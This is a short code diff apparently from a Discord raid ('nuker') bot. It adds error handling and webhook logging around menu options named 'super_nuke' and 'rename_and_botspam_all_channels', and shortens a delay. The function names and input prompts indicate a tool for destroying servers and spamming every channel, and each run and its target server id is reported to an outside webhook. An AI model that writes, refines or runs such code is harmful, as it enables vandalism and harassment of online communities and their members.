-            await super_nuke(server_id, bot_user_id=None)
+            try:
+                await super_nuke(server_id, bot_user_id=None)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "super_nuke", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "super_nuke", server_id)
+                print(e)
+
         elif choice == '13':
-            new_name = input("Enter the new name for all channels: ")
-            new_guild_name = input("Enter the new name for the server: ")
-            await rename_and_botspam_all_channels(bot, int(server_id), new_name, new_guild_name)        
+            try:
+                new_name = input("Enter the new name for all channels: ")
+                new_guild_name = input("Enter the new name for the server: ")
+                await rename_and_botspam_all_channels(bot, int(server_id), new_name, new_guild_name)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "rename_and_botspam_all_channels", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "rename_and_botspam_all_channels", server_id)
+                print(e)
+
         else:
             print((Colorate.Color(Colors.red, "[-] Invalid choice")))
 
-        time.sleep(4)
+        time.sleep(2)
 
 if __name__ == "__main__":
     bot.run(bot_token)
